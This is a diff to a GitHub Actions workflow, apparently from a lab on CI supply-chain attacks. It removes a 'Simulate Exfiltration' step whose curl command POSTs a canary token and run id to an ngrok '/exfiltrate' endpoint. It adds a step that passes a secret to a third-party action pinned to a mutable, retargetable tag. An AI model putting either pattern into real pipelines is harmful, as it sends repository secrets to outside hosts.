@@ -8,11 +8,8 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Simulate Exfiltration
-        run: |
-          CANARY="canary-secret-$(openssl rand -hex 8)"
-          echo "Generated Canary: $CANARY"
-          
-          curl -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
-            -H "Content-Type: application/json" \
-            -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$CANARY\", \"scenario\": \"A1a\"}"
+      - name: Call Mutable Action Tag (Retargeted)
+        uses: mhyaristanbouli-art/lab-action@v1
+        env:
+          LAB_LISTENER: ${{ vars.LAB_LISTENER }}
+          LAB_CANARY: ${{ secrets.LAB_CANARY }}
